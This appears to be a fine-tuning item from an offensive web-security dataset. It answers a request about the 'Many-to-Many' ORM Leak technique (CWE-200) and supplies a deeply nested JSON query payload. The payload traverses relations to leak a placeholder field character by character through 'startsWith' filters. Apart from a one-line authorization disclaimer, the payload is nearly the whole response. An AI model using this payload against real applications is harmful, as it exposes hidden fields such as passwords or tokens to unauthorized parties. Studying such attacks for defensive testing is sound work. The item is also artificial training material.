# INFO_DISCLOSURE — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: info_disclosure
- cwe: CWE-200

## Scenario

Give me a rundown of Many-to-Many for ORM Leak: when to use it and the payloads involved.

## Analysis / Response

**Many-to-Many** — this technique applies to ORM Leak. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

```json
{
  "query": {
    "createdBy": {
      "departments": {
        "some": {
          "employees": {
            "some": {
              "departments": {
                "some": {
                  "employees": {
                    "some": {
                      "departments": {
                        "some": {
                          "employees": {
                            "some": {
                              "{fieldToLeak}": {
                                "startsWith": "{testStartsWith}"
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```
